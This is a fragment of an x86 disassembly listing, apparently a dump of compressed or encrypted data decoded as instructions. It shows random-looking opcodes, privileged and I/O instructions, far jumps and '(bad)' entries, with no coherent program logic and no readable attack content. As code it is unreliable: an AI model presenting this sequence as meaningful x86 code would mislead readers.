  419b65:	add    al,BYTE PTR [esi]
  419b67:	mov    fs,WORD PTR [ebx+0x6bf45800]
  419b6d:	rsm    
  419b6f:	mov    ss,WORD PTR [eax]
  419b71:	fwait
  419b72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b73:	jo     0x419b7d
  419b75:	and    BYTE PTR [ebx-0x6f51b279],dl
  419b7b:	mov    bl,0xc5
  419b7d:	inc    ebx
  419b7e:	in     al,dx
  419b7f:	cdq    
  419b80:	cmp    ah,BYTE PTR [esi]
  419b82:	or     al,0x87
  419b84:	test   DWORD PTR [edi],edx
  419b86:	cwde   
  419b87:	loopne 0x419bca
  419b89:	push   eax
  419b8a:	adc    eax,0x6715f5ab
  419b8f:	and    ebp,DWORD PTR [ebx]
  419b91:	or     al,0x2a
  419b93:	xchg   DWORD PTR [ebx+ebp*2-0x76],ecx
  419b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b98:	fld    QWORD PTR [ebx]
  419b9a:	or     bl,cl
  419b9c:	bound  esi,QWORD PTR [ebx-0x42]
  419b9f:	mov    esp,ecx
  419ba1:	aas    
  419ba2:	fnsave [ebp+0x3f2e3cce]
  419ba8:	pop    esp
  419ba9:	mov    edx,DWORD PTR [edi-0x3b71742d]
  419baf:	pop    ebx
  419bb0:	jecxz  0x419bd0
  419bb2:	sub    BYTE PTR [ecx],ch
  419bb4:	jge    0x419bef
  419bb6:	hlt    
  419bb7:	mov    ds:0x2494be8,al
  419bbc:	pop    ebp
  419bbd:	jmp    FWORD PTR [eax-0x681aa228]
  419bc3:	xor    eax,0x99d6e7c4
  419bc8:	lods   al,BYTE PTR ds:[esi]
  419bc9:	sbb    eax,0x133b1145
  419bce:	mov    al,ds:0xb26be9a2
  419bd3:	dec    ebp
  419bd4:	jg     0x419c3f
  419bd6:	inc    ebp
  419bd7:	mov    eax,0x52b65290
  419bdc:	int3   
  419bdd:	pop    ecx
  419bde:	push   edi
  419bdf:	mov    ?,WORD PTR [esi+eax*2+0x51]
  419be3:	mov    esp,0xebadbeb1
  419be8:	pop    ss
  419be9:	inc    eax
  419bea:	xchg   DWORD PTR [esi],eax
  419bec:	jne    0x419bba
  419bee:	and    bh,BYTE PTR [edx-0x5a]
  419bf1:	push   ss
  419bf2:	mov    ah,0xdb
  419bf4:	(bad)  
  419bf6:	call   0x638c:0xcd920a98
  419bfd:	mov    eax,ds:0x13f47f92
  419c02:	xrelease xchg BYTE PTR [edi+ecx*8],cl
  419c06:	hlt    
  419c07:	sbb    eax,0x18d453dd
  419c0c:	pop    ebp
  419c0d:	add    eax,DWORD PTR [ebx+0x2744d9b7]
  419c13:	outs   dx,DWORD PTR ds:[esi]
  419c14:	add    ecx,DWORD PTR [eax-0x219154be]
  419c1a:	xchg   edx,eax
  419c1b:	inc    edi
  419c1c:	fst    QWORD PTR [ebp+0x6194adc8]
  419c22:	sbb    DWORD PTR [ecx+ecx*1-0x611ff0c0],ecx
  419c29:	into   
  419c2a:	sub    BYTE PTR [eax-0x3e],bh
  419c2d:	imul   esp,DWORD PTR [ebp-0x2691a742],0x3c9b9d6
  419c37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419c38:	(bad)  
  419c39:	pop    edi
  419c3a:	ins    BYTE PTR es:[edi],dx
  419c3b:	mov    ?,edx
  419c3d:	mov    edi,0xe337946f
  419c42:	sub    ebp,edx
  419c44:	jmp    0x419bff
  419c46:	xchg   esi,eax
  419c47:	fldcw  WORD PTR ds:0x95761f20
  419c4d:	cmp    eax,0xac3e35ef
  419c52:	or     al,BYTE PTR [edi-0x1262771f]
  419c58:	fld    QWORD PTR [esi]
  419c5a:	sbb    bh,al
  419c5c:	push   esi
  419c5d:	fwait
  419c5e:	cmp    dl,BYTE PTR [edi-0x7807bfff]
  419c64:	sti    
  419c65:	aad    0xfc
  419c67:	pop    edx
  419c68:	scas   eax,DWORD PTR es:[edi]
  419c69:	adc    BYTE PTR [edi+0x4a3f4fe8],0x85
  419c70:	outs   dx,DWORD PTR ds:[esi]
  419c71:	fwait
  419c72:	jmp    0x419ce2
  419c74:	dec    ecx
  419c75:	inc    ebp
  419c76:	mov    ch,0x86
  419c78:	cwde   
  419c79:	cdq    
  419c7a:	pop    esi
  419c7b:	fs push esp
  419c7d:	fs xchg edi,eax
  419c7f:	mov    dl,0x9f
  419c81:	mov    al,ds:0x55f1eb5f
  419c86:	dec    ebx
  419c87:	or     DWORD PTR [ecx+esi*2+0x5],ecx
  419c8b:	xchg   DWORD PTR [edi-0x3a],esi
  419c8e:	xchg   edx,eax
  419c8f:	jb     0x419c6e
  419c91:	clc    
  419c92:	mov    ?,WORD PTR [edi-0x6ad86792]
  419c98:	sub    al,0x40
  419c9a:	jbe    0x419c7a
  419c9c:	push   es
  419c9d:	xchg   DWORD PTR [ebx],ebx
  419c9f:	cmp    eax,0x7f97c529
  419ca4:	jne    0x419d24
  419ca6:	leave  
  419ca7:	add    bl,BYTE PTR [ecx*4+0x12c847]
  419cae:	in     al,dx
  419caf:	xchg   BYTE PTR [eax],bh
  419cb1:	push   cs
  419cb2:	sub    DWORD PTR [esi+0x7feeddf],ebx
  419cb8:	aam    0x9c
  419cba:	clc    
  419cbb:	out    0xd3,al
  419cbd:	js     0x419c6e
  419cbf:	in     ax,0xb0
  419cc2:	push   es
  419cc3:	xchg   DWORD PTR [eax],ebx
  419cc5:	in     eax,dx
  419cc6:	pop    ebx
  419cc7:	push   edi
  419cc8:	pop    ebx
  419cc9:	push   cs
  419cca:	adc    ebp,DWORD PTR [eax+eiz*8-0x4c]
  419cce:	ja     0x419d13
  419cd0:	pop    ebx
  419cd1:	mov    bl,0x32
  419cd3:	fild   DWORD PTR [edi-0x62a91315]
  419cd9:	mov    ebp,0x5dcbc417
  419cde:	mov    esi,DWORD PTR [ebx+0x47974e2b]
  419ce4:	int3   
  419ce5:	fwait
  419ce6:	sub    edx,ebx
  419ce8:	jns    0x419d65
  419cea:	push   es
  419ceb:	adc    DWORD PTR [ebx+0x1f875e49],ebx
  419cf1:	pop    eax
  419cf2:	xor    BYTE PTR [edi-0x2d],cl
  419cf5:	lea    eax,[ebp-0x63f2210f]
  419cfb:	out    0xb1,al
  419cfd:	xor    BYTE PTR [eax],cl
  419cff:	cmp    ax,0x40f2
  419d03:	adc    ebp,edi
  419d05:	jecxz  0x419d25
  419d07:	xchg   DWORD PTR [edi+0x36],edi
  419d0a:	enter  0xdd42,0x26
  419d0e:	int3   
  419d0f:	jae    0x419cca
  419d11:	add    edx,DWORD PTR [ebp-0x6fc003b7]
  419d17:	pushf  
  419d18:	rol    DWORD PTR [ebx-0x72],1
  419d1b:	and    ch,BYTE PTR [eax]
  419d1d:	sbb    BYTE PTR [eax-0x4242c5fe],bl
  419d23:	sub    ebp,esp
  419d25:	and    BYTE PTR [ebp+0x5d40b3fe],bh
  419d2b:	pop    ss
  419d2c:	test   al,0x72
  419d2e:	loope  0x419d25
  419d30:	aaa    
  419d31:	ret    0x4b97
  419d34:	das    
  419d35:	cmp    eax,0xf198f302
  419d3a:	cmp    DWORD PTR [edx-0x51],esi
  419d3d:	out    dx,eax
  419d3e:	fiadd  WORD PTR [esi+0x2f255500]
  419d44:	fucom  st(4)
  419d46:	sbb    BYTE PTR [edx+ecx*1+0x45],ch
  419d4a:	mov    eax,ds:0xda404bb7
  419d4f:	in     eax,0x94
  419d51:	or     BYTE PTR [edi+0x13e750b5],dl
  419d57:	(bad)  
  419d59:	daa    
  419d5a:	test   eax,0xe1ace998
  419d5f:	fdivr  QWORD PTR [esi]
  419d61:	inc    eax
  419d62:	mov    ebx,0xcfeca58d
  419d67:	bnd ret 0x9760
  419d6b:	dec    ebp
  419d6c:	shr    DWORD PTR [edx+0x1ea3d060],0x63
  419d73:	jge    0x419daf
  419d75:	outs   dx,BYTE PTR ds:[esi]
  419d76:	sbb    DWORD PTR [edx-0x4f781a4d],ecx
  419d7c:	cmp    DWORD PTR [edx-0x51],edi
  419d7f:	lods   al,BYTE PTR es:[esi]
  419d81:	stos   DWORD PTR es:[edi],eax
  419d82:	aas    
  419d83:	push   edi
  419d84:	in     eax,dx
  419d85:	pop    ebp
  419d86:	fwait
  419d87:	inc    ebx
  419d88:	jne    0x419d0a
  419d8a:	call   0xd055d641
  419d8f:	rol    ecx,cl
  419d91:	leave  
  419d92:	xchg   edi,eax
  419d93:	jo     0x419e0e
  419d95:	(bad)  
  419d96:	addr16 jp 0x419d86
  419d99:	mov    bl,0x87
  419d9b:	into   
  419d9c:	nop
  419d9d:	cmp    DWORD PTR [eax],0xcbd1e299
  419da3:	xchg   DWORD PTR [ecx],eax
  419da5:	sub    BYTE PTR [ecx+edi*1-0x14],cl
  419da9:	scas   eax,DWORD PTR es:[edi]
  419daa:	inc    esi
  419dab:	rol    BYTE PTR [edx],cl
  419dad:	add    BYTE PTR [esp+ecx*1+0x2d],0xe
  419db2:	xchg   edi,eax
  419db3:	push   ebx
  419db4:	arpl   WORD PTR [ebx],cx
  419db6:	sti    
  419db7:	mov    ds:0x64825482,al
  419dbc:	fucom  st(1)
  419dbe:	in     eax,0x77
  419dc0:	xchg   ecx,eax
  419dc1:	xchg   edi,eax
  419dc2:	or     ecx,DWORD PTR [ebx-0x27120323]
  419dc8:	jl     0x419de9
  419dca:	cdq    
  419dcb:	dec    eax
  419dcc:	sbb    al,0x56
  419dce:	les    esi,FWORD PTR [edi]
  419dd0:	push   ss
  419dd1:	inc    eax
  419dd2:	mov    ah,0x62
  419dd4:	sti    
  419dd5:	dec    ecx
  419dd6:	popa   
  419dd7:	push   edx
  419dd8:	fucomp st(5)
  419dda:	scas   eax,DWORD PTR es:[edi]
  419ddb:	aas    
  419ddc:	fdiv   st(4),st
  419dde:	sbb    ah,BYTE PTR [esi+0x5f]
  419de1:	clc    
  419de2:	sar    DWORD PTR [edx-0x6e52e864],1
  419de8:	mov    ebp,0xdd378ff8
  419ded:	sbb    ch,BYTE PTR [edi+eiz*4+0x6b93c50e]
  419df4:	out    dx,eax
  419df5:	and    esp,DWORD PTR [eax-0x7e]
  419df8:	jmp    0x419e2d
  419dfa:	mov    edi,0xf91f098d
  419dff:	fsub   st,st(0)
  419e01:	sub    dh,BYTE PTR [edi-0x2c]
  419e04:	pop    esi
  419e05:	push   cs
  419e06:	cwde   
  419e07:	jbe    0x419dc8
  419e09:	ja     0x419e45
  419e0b:	push   esp
  419e0c:	fwait
  419e0d:	pop    ebp
  419e0e:	bswap  ebx
  419e10:	cld    
  419e11:	ins    BYTE PTR es:[edi],dx
  419e12:	mov    gs,WORD PTR ss:0x4678c370
  419e19:	dec    ebp
  419e1a:	pushf  
  419e1b:	nop
  419e1c:	icebp  
  419e1d:	dec    ebp
  419e1e:	sar    BYTE PTR [ebp+0x4257cbdd],1
  419e24:	sti    
  419e25:	mov    edi,esp
  419e27:	push   edx
  419e28:	fisubr DWORD PTR [ecx]
  419e2a:	mov    ebx,0xae18ba86
  419e2f:	mov    bl,0xdd
  419e31:	(bad)  
  419e32:	in     al,dx
  419e33:	push   0x3ccb61e6
  419e38:	xchg   edi,eax
  419e39:	lock or eax,0xdc1fa61a
  419e3f:	xchg   BYTE PTR [edx+0x5],dl
  419e42:	pop    esp
  419e43:	in     al,dx
  419e44:	cld    
  419e45:	cwde   
  419e46:	xchg   edx,eax
  419e47:	and    ebx,ebp
  419e49:	push   esi
  419e4a:	rcr    DWORD PTR [eax-0x3e],cl
  419e4d:	nop
  419e4e:	mov    ebx,ebp
  419e50:	dec    ebx
  419e51:	and    BYTE PTR [ebx-0x79],dl
  419e54:	mov    ebx,DWORD PTR [edi]
  419e56:	adc    dl,BYTE PTR [edx-0x64bc1123]
  419e5c:	fist   DWORD PTR gs:[eax+0x75401a09]
  419e63:	ja     0x419e0b
  419e65:	scas   al,BYTE PTR es:[edi]
  419e66:	aad    0x3e
  419e68:	rol    BYTE PTR [ecx+0x780d1aaa],cl
  419e6e:	xchg   edi,eax
  419e6f:	cmp    al,0xae
  419e71:	push   edx
  419e72:	dec    esp
  419e73:	jl     0x419e91
  419e75:	inc    eax
  419e76:	sub    BYTE PTR [ecx-0x13],bh
  419e79:	jb     0x419e15
  419e7b:	or     eax,0x689ab8b2
  419e80:	out    dx,al
  419e81:	xchg   ebx,eax
  419e82:	retf   
  419e83:	xchg   ebx,eax
  419e84:	data16 loopne 0x419e12
  419e87:	das    
  419e88:	les    ecx,FWORD PTR [edi-0x3a]
  419e8b:	(bad)  [esi]
  419e8d:	std    
  419e8e:	push   edi
  419e8f:	mov    edi,0xade2016f
  419e94:	fisttp QWORD PTR [ebx-0x3a8381df]
  419e9a:	add    dh,BYTE PTR ds:0xdff857f0
  419ea0:	pop    edi
  419ea1:	mov    ah,0xff
  419ea3:	fsincos 
  419ea5:	pop    ss
  419ea6:	loope  0x419f1a
  419ea8:	sbb    eax,0xb892d61a
  419ead:	jbe    0x419ea5
  419eaf:	stos   BYTE PTR es:[edi],al
  419eb0:	sbb    cl,bh
  419eb2:	mov    dh,BYTE PTR [bp+si-0x5f]
  419eb6:	xchg   edi,eax
  419eb7:	xchg   edi,esi
  419eb9:	popa   
  419eba:	imul   edx
  419ebc:	cmp    dl,BYTE PTR [ecx+ebx*1]
  419ebf:	sub    edx,DWORD PTR [edx+ebp*8]
  419ec2:	jbe    0x419e4b
  419ec4:	cmp    al,0x16
  419ec6:	retf   0xddcc
  419ec9:	xor    esi,DWORD PTR [ebp-0x7f861885]
  419ecf:	cwde   
  419ed0:	mov    dh,0x40
  419ed2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419ed3:	jbe    0x419f01
  419ed5:	shr    BYTE PTR [edi-0x66fad712],0xfd
  419edc:	int3   
  419edd:	aad    0xf6
  419edf:	pushf  
  419ee0:	cs jp  0x419f62
  419ee3:	adc    edx,DWORD PTR [edi-0x4551e3b9]
  419ee9:	sahf   
  419eea:	fisttp QWORD PTR [ecx+0x16]
  419eed:	lock push es
  419eef:	pop    ss
  419ef0:	int    0xf6
  419ef2:	xchg   edi,eax
  419ef3:	in     al,dx
  419ef4:	push   eax
  419ef5:	pop    edi
  419ef6:	loop   0x419ee7
  419ef8:	test   eax,0x786aef25
  419efd:	xchg   edx,eax
  419efe:	add    al,BYTE PTR [edi+0x74f2e768]
  419f04:	pop    ss
  419f05:	mov    esi,0x772ddc60
  419f0a:	dec    esi
  419f0b:	mov    cs,ebp
  419f0d:	jp     0x419f09
  419f0f:	jecxz  0x419f65
  419f11:	inc    eax
  419f12:	int3   
  419f13:	adc    eax,0x92642535
  419f18:	ins    DWORD PTR es:[edi],dx
  419f19:	push   es
  419f1a:	cwde   
  419f1b:	pop    esi
  419f1c:	jge    0x419ebe
  419f1e:	retf   0x6653
  419f21:	cli    
  419f22:	lods   al,BYTE PTR ds:[esi]
  419f23:	dec    ebx
  419f24:	sub    BYTE PTR [edi-0x4c],dh
  419f27:	mov    ecx,DWORD PTR [edx-0x40]
  419f2a:	lods   eax,DWORD PTR ds:[esi]
  419f2b:	xchg   ebp,eax
  419f2c:	ror    BYTE PTR [ebx-0x69],1
  419f2f:	and    ebp,DWORD PTR [edi+0x24]
  419f32:	lock adc eax,0xff617b76
  419f38:	out    0x86,eax
  419f3a:	xchg   DWORD PTR [esi-0x6f879a23],edx
  419f40:	pop    ecx
  419f41:	aam    0x97
  419f43:	lds    eax,FWORD PTR [ecx+0x18]
  419f46:	add    al,0x53
  419f48:	mov    al,0x5a
  419f4a:	hlt    
  419f4b:	xchg   esp,eax
  419f4c:	mov    DWORD PTR ds:0x95f18791,eax
  419f52:	out    dx,eax
  419f53:	adc    al,0xb9
  419f55:	lock xchg edi,eax
  419f57:	mov    ebp,0x2d2065d3
  419f5c:	xor    bh,BYTE PTR [esi+0xd]
  419f5f:	ds push ss
  419f61:	jne    0x419f7a
  419f63:	and    al,0xb0
  419f65:	int    0xd5
  419f67:	neg    BYTE PTR [ecx-0x13dd6835]
  419f6d:	jns    0x419f7e
  419f6f:	icebp  
  419f70:	into   
  419f71:	dec    ebp
  419f72:	mov    DWORD PTR [ebx-0x790fd35b],esp
  419f78:	out    0x20,eax
  419f7a:	inc    ebx
  419f7b:	push   ss
  419f7c:	fnsave [edi]
  419f7e:	fmul   QWORD PTR [ebx]
  419f80:	jmp    0xb45ea83a
  419f85:	inc    eax
  419f86:	push   esp
  419f87:	jbe    0x419f78
  419f89:	push   edi
  419f8a:	xor    DWORD PTR [ebp+edi*8+0x67],0xcb2b4b97
  419f92:	mov    al,0xc3
  419f94:	retf   
  419f95:	out    0xfc,al
  419f97:	popf   
  419f98:	inc    ebp
  419f99:	int3   
  419f9a:	add    esi,DWORD PTR [ebx-0x71da3eb9]
  419fa0:	mov    ah,0x21
  419fa2:	imul   eax,DWORD PTR [edi-0x73],0xffffff8b
  419fa6:	xchg   edi,eax
  419fa7:	jns    0x419f55
  419fa9:	out    0x21,eax
  419fab:	enter  0xb5ce,0x84
  419faf:	das    
  419fb0:	push   ebx
  419fb1:	pop    edx
  419fb2:	xor    eax,0x9996da87
  419fb7:	dec    eax
  419fb8:	in     al,dx
  419fb9:	retf   
  419fba:	mov    edx,0xb02f08cf
  419fbf:	xchg   ecx,eax
  419fc0:	orps   xmm4,XMMWORD PTR [eax]
  419fc3:	pop    es
  419fc4:	pop    ecx
  419fc5:	dec    edi
  419fc6:	in     eax,0xa4
  419fc8:	fucomi st,st(0)
  419fca:	not    DWORD PTR [edi-0x5d]
  419fcd:	mov    ebx,0xdedd3df5
  419fd2:	call   0xf47c:0xd265d118
  419fd9:	and    ebx,DWORD PTR [edx+0x29]
  419fdc:	ja     0x419f85
  419fde:	jge    0x419f67
  419fe0:	pop    ebx
  419fe1:	lds    eax,FWORD PTR [eax-0x6e]
  419fe4:	push   ss
  419fe5:	in     al,dx
  419fe6:	jl     0x41a04e
  419fe8:	jb     0x41a025
  419fea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419feb:	pop    es
  419fec:	scas   al,BYTE PTR es:[edi]
  419fed:	(bad)  
  419fee:	xchg   ebx,eax
  419fef:	mov    al,ds:0x2dda4e82
  419ff4:	lods   eax,DWORD PTR ds:[esi]
  419ff5:	mov    eax,0xb764d4b7
  419ffa:	fs jae 0x41a016
  419ffd:	and    DWORD PTR [esi],esi
  419fff:	(bad)  
  41a000:	fwait
  41a001:	aas    
  41a002:	jb     0x41a00b
  41a004:	outs   dx,DWORD PTR ds:[esi]
  41a005:	dec    ebx
  41a006:	xor    BYTE PTR [esi+ecx*8+0x27],ch
  41a00a:	inc    eax
  41a00b:	mov    cs,WORD PTR [eax+eax*1-0x427dc28c]
  41a012:	mov    ch,0x79
  41a014:	in     al,0xf1
  41a016:	xlat   BYTE PTR ds:[ebx]
  41a017:	cmp    DWORD PTR [esi+0x1516befa],ecx
  41a01d:	inc    eax
  41a01e:	out    dx,al
  41a01f:	mov    eax,ds:0x56864c55
  41a024:	test   eax,0xc1369744
  41a029:	jnp    0x41a02d
  41a02b:	jecxz  0x419fbe
  41a02d:	and    eax,0x165cb35f
  41a032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a033:	les    ebp,FWORD PTR [eax]
  41a035:	into   
  41a036:	ja     0x419fe7
  41a038:	das    
  41a039:	xchg   edi,eax
  41a03a:	sub    al,0x95
  41a03c:	fst    st(5)
  41a03e:	(bad)  
  41a03f:	cs mov esi,0x8092b700
  41a045:	inc    eax
  41a046:	cli    
  41a047:	bound  ebp,QWORD PTR [ebx+ebx*8-0x623be87d]
  41a04e:	mov    dh,0x14
  41a050:	shl    BYTE PTR [ecx-0x6e],cl
  41a053:	and    eax,0x89eaf465
  41a058:	mov    eax,fs
  41a05a:	inc    ecx
  41a05b:	das    
  41a05c:	add    al,0x40
  41a05e:	add    eax,0x53375f19
  41a063:	retf   
  41a064:	push   esp
  41a065:	fistp  WORD PTR [eax-0x5b03a8d5]
  41a06b:	call   0x6efd:0x291776cf
  41a072:	xchg   BYTE PTR [ecx+0x39],bl
  41a075:	jne    0x41a089
  41a077:	adc    ebp,ebx
  41a079:	fsubrp st(1),st
  41a07b:	imul   esi,DWORD PTR [ebx-0x2b0dca93],0x20184ab5
  41a085:	mov    BYTE PTR [esi],ah
  41a087:	xchg   DWORD PTR [edx+0x1ad61a5b],eax
  41a08d:	popa   
  41a08e:	mov    ebp,0x4c3f566d
  41a093:	pop    es
  41a094:	pop    esi
  41a095:	xor    BYTE PTR [ebx-0x23ce1e7e],bh
  41a09b:	xchg   BYTE PTR [edi-0x1fe40b49],bh
  41a0a1:	cld    
  41a0a2:	aam    0xf2
  41a0a4:	adc    al,0x8c
  41a0a6:	inc    ebx
  41a0a7:	push   edi
  41a0a8:	ins    BYTE PTR es:[edi],dx
  41a0a9:	nop
  41a0aa:	mov    bl,0x4e
  41a0ac:	mov    WORD PTR [esi-0x67],cs
  41a0af:	xchg   BYTE PTR [edx-0x143908b3],dl
  41a0b5:	out    0xbb,eax
  41a0b7:	add    esi,DWORD PTR [ecx+0x40]
  41a0ba:	mov    ecx,0x23184f51
  41a0bf:	dec    esi
  41a0c0:	and    DWORD PTR [edx],edi
  41a0c2:	cdq    
  41a0c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a0c4:	or     al,0xde
  41a0c6:	in     al,0x46
  41a0c8:	push   ebp
  41a0c9:	add    dl,bh
  41a0cb:	jno    0x41a137
  41a0cd:	(bad)  
  41a0ce:	pop    edi
  41a0cf:	xor    al,0xbd
  41a0d1:	inc    edx
  41a0d2:	xchg   DWORD PTR [edx+0x2837bf2d],esi
  41a0d8:	das    
  41a0d9:	aaa    
  41a0da:	xchg   edx,eax
  41a0db:	mov    fs,WORD PTR [eax+esi*2]
  41a0de:	add    eax,0x97dc7868
  41a0e3:	adc    BYTE PTR [ebx-0x441f1aae],al
  41a0e9:	or     BYTE PTR [esi+0x10],ah
  41a0ec:	sti    
  41a0ed:	test   DWORD PTR fs:[edi-0x2432828f],eax
  41a0f4:	frstor [edx-0x545dcf59]
  41a0fa:	repz jecxz 0x41a0c9
  41a0fd:	inc    eax
  41a0fe:	(bad)  
  41a0ff:	mov    dl,0x4d
  41a101:	(bad)  
  41a103:	mov    edi,0x2a9a14ba
  41a108:	cdq    
  41a109:	mov    al,ds:0x88c1da
  41a10e:	cdq    
  41a10f:	scas   eax,DWORD PTR es:[edi]
  41a110:	add    BYTE PTR [ecx-0x7],0xb6
  41a114:	ja     0x41a0b9
  41a116:	(bad)  
  41a117:	fcomp  DWORD PTR [ecx]
  41a119:	sbb    BYTE PTR [edi],dl
  41a11b:	pop    ecx
  41a11c:	fnsave [edx]
  41a11e:	cmp    al,0x7b
  41a120:	cld    
  41a121:	cld    
  41a122:	nop
  41a123:	cmc    
  41a124:	in     eax,0x5c
  41a126:	gs push ss
  41a128:	sub    eax,0x35f75bc0
  41a12d:	jbe    0x41a102
  41a12f:	rcr    ebp,cl
  41a131:	aaa    
  41a132:	scas   al,BYTE PTR es:[edi]
  41a133:	xor    BYTE PTR [edi-0x66],dl
  41a136:	mov    dh,BYTE PTR [ecx+eiz*8+0x44]
  41a13a:	pop    ebp
  41a13b:	mov    dh,0x41
  41a13d:	jnp    0x41a0f6
  41a13f:	das    
  41a140:	std    
  41a141:	icebp  
  41a142:	imul   eax,DWORD PTR [edi-0x23],0x7b
  41a146:	and    ebx,DWORD PTR ds:0xf4f8f5ab
  41a14c:	out    dx,eax
  41a14d:	aas    
  41a14e:	and    BYTE PTR [ecx],dl
  41a150:	pushf  
  41a151:	jmp    0x41a155
  41a153:	xchg   esi,eax
  41a154:	inc    esi
  41a155:	fcom   DWORD PTR [edi+0x126bc73e]
  41a15b:	mov    ebp,0x42474221
  41a160:	adc    BYTE PTR [ebx],0x18
  41a163:	xchg   DWORD PTR [esi+0x10],ecx
  41a166:	cmp    DWORD PTR [ebx*8+0x5b72a516],ecx
  41a16d:	ins    BYTE PTR es:[edi],dx
  41a16e:	mov    edi,0x7c403ed2
  41a173:	mov    ds:0xb5945f23,al
  41a178:	mov    ebx,0x3daf97bb
  41a17d:	xor    eax,DWORD PTR [ebx]
  41a17f:	xlat   BYTE PTR ds:[ebx]
  41a180:	and    BYTE PTR [ebp-0x66a3a12b],bl
  41a186:	xchg   edi,eax
  41a187:	shl    BYTE PTR [edi],cl
  41a189:	cmp    eax,0xa4d221fd
  41a18e:	mov    ch,0xb7
  41a190:	ins    BYTE PTR es:[edi],dx
  41a191:	lods   eax,DWORD PTR ds:[esi]
  41a192:	push   edi
  41a193:	mov    ds:0x9d562825,eax
  41a198:	xor    BYTE PTR [eax+0x36],al
  41a19b:	xor    bh,0xa6
  41a19e:	and    esi,ecx
  41a1a0:	xor    DWORD PTR [esi+edx*8+0x3a406ac5],0xe4ed150a
  41a1ab:	fs iret 
  41a1ad:	inc    eax
  41a1ae:	shr    DWORD PTR [edi+edi*1],cl
  41a1b1:	shr    DWORD PTR [ebx],cl
  41a1b3:	jge    0x41a19c
  41a1b5:	cmp    edx,ebx
  41a1b7:	and    esp,DWORD PTR [eax+eax*8+0x58]
  41a1bb:	dec    ebp
  41a1bc:	cmp    DWORD PTR [esi+eax*4-0x4bc012b9],0x253a8a0c
  41a1c7:	or     ecx,DWORD PTR [edi-0x59036861]
  41a1cd:	jmp    0xa171:0xf8a19500
  41a1d4:	vunpckhps xmm0,xmm7,XMMWORD PTR [edi-0x892eba2]
  41a1dc:	in     al,dx
  41a1dd:	jl     0x41a1f2
  41a1df:	aad    0x7e
  41a1e1:	mov    al,ds:0xd90ac132
  41a1e6:	inc    ecx
  41a1e7:	or     al,0x2d
  41a1e9:	pop    edx
  41a1ea:	pop    esi
  41a1eb:	xchg   edx,ebx
  41a1ed:	ins    BYTE PTR es:[edi],dx
  41a1ee:	rep outs dx,DWORD PTR ds:[esi]
  41a1f0:	fstp   QWORD PTR [edx-0x1]
  41a1f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a1f4:	(bad)  
  41a1f5:	iret   
  41a1f6:	jae    0x41a1e0
  41a1f8:	shl    BYTE PTR [edi+eax*8+0x66],cl
  41a1fc:	scas   eax,DWORD PTR es:[edi]
  41a1fd:	inc    eax
  41a1fe:	mov    al,0xf5
  41a200:	xchg   ebp,eax
  41a201:	sahf   
  41a202:	push   ebp
  41a203:	retf   0x8add
  41a206:	jo     0x41a22b
  41a208:	gs aad 0xe6
  41a20b:	xor    eax,0xed18409e
  41a210:	push   cs
  41a211:	xor    DWORD PTR ds:0x978ed4ea,0xf919d18a
  41a21b:	jmp    0x41a218
  41a21d:	ret    
  41a21e:	push   cs
  41a21f:	mov    eax,ds:0x87942941
  41a224:	mov    esp,DWORD PTR [ebx+0x7fe4c432]
  41a22a:	cmp    BYTE PTR [esi],bh
  41a22c:	fcomp  QWORD PTR [edi-0x29]
  41a22f:	add    DWORD PTR [ebp+0xa],0xb000abf3
  41a236:	(bad)  
  41a237:	imul   eax,ebp,0x40
  41a23a:	sbb    BYTE PTR [ebp-0x76],bh
  41a23d:	rcr    DWORD PTR [ebx+0x1c],1
  41a240:	xlat   BYTE PTR ds:[ebx]
  41a241:	sbb    al,0x98
  41a243:	push   ebx
  41a244:	jmp    0x2aa5:0x6d69dadd
  41a24b:	addr16 mov al,ds:0xdc0e
  41a24f:	xchg   BYTE PTR [edi-0x9],dh
  41a252:	mov    al,0xfb
  41a254:	loopne 0x41a287
  41a256:	dec    DWORD PTR [eax]
  41a258:	lea    edi,[esi-0x7e75ef6b]
  41a25e:	lea    ecx,[eax]
  41a260:	mov    al,0x5a
  41a262:	push   0xffffffe7
  41a264:	scas   al,BYTE PTR es:[edi]
  41a265:	fcom   st(5)
  41a267:	xchg   cl,ch
  41a269:	loopne 0x41a25b
  41a26b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a26c:	out    0xfd,al
  41a26e:	(bad)  
  41a26f:	cdq    
  41a270:	mov    eax,0x5065cf43
  41a275:	cmp    BYTE PTR [edx],bl
  41a277:	add    al,0xe3
  41a279:	aas    
  41a27a:	jmp    0x41a1fe
  41a27c:	push   ebx
  41a27d:	push   ebp
  41a27e:	out    dx,eax
  41a27f:	rcl    DWORD PTR [ebp+0xd],1
  41a282:	ror    DWORD PTR [ecx-0x261fc003],cl
  41a288:	sti    
  41a289:	popf   
  41a28a:	mov    BYTE PTR [eax-0x152ebfe6],dh
  41a290:	je     0x41a2f6
  41a292:	inc    esp
  41a293:	sar    DWORD PTR [ecx+0x5221976f],cl
  41a299:	mov    al,ds:0xa2d1e2e1
  41a29e:	lock cs dec edi
  41a2a1:	inc    eax
  41a2a2:	inc    ebx
  41a2a3:	cld    
  41a2a4:	test   BYTE PTR [edi+0x62],bl
  41a2a7:	aam    0xff
  41a2a9:	xchg   ecx,eax
  41a2aa:	push   ss
  41a2ab:	cmp    al,0xdd
  41a2ad:	pop    ebx
  41a2ae:	bnd jae 0x41a30e
  41a2b1:	gs dec eax
  41a2b3:	data16 aaa 
  41a2b5:	inc    eax
  41a2b6:	das    
  41a2b7:	icebp  
  41a2b8:	repnz sahf 
  41a2ba:	sub    al,0x1b
  41a2bc:	mov    ch,0xe7
  41a2be:	xchg   edi,eax
  41a2bf:	inc    esp
  41a2c0:	xchg   edx,eax
  41a2c1:	inc    edx
  41a2c2:	outs   dx,BYTE PTR ds:[esi]
  41a2c3:	fs int3 
  41a2c5:	retf   
  41a2c6:	dec    eax
  41a2c7:	push   ebx
  41a2c8:	in     eax,0xfc
  41a2ca:	cmc    
  41a2cb:	mov    DWORD PTR ds:0x9e9d7ff6,ebx
  41a2d1:	scas   al,BYTE PTR es:[edi]
  41a2d2:	xchg   edi,eax
  41a2d3:	pop    esi
